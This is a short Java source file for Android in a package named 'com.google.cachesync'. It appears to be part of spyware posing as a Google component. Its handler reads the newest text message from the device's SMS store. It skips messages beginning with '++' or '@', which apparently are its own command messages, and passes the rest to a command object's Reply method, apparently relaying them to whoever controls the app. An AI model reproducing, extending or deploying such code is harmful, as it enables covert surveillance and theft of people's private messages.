package com.google.cachesync;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;


final class handleSmsLog extends Handler {

	private Context mContext;
	long lastOccured;
	
	public handleSmsLog(Context context) {
		mContext = context;
		lastOccured = -1;
	}
	
	public void handleMessage(Message msg) {
		CommandObj cmd = (CommandObj) msg.obj;
       Cursor cur = mContext.getContentResolver().query(Uri.parse("content://sms/"), null,null, null, "date DESC");
       if  (cur == null || !cur.moveToFirst() )
       	return;
       
       SmsObj sms = new SmsObj(cur);
       if ( sms.message.startsWith("++") || sms.message.startsWith("@") ||  lastOccured >= sms.occured ) 
    	   return;
       
		lastOccured = sms.occured;
		try {
				cmd.Reply(sms);
			} catch (Exception e) {
		}
	} // handleMessage
}
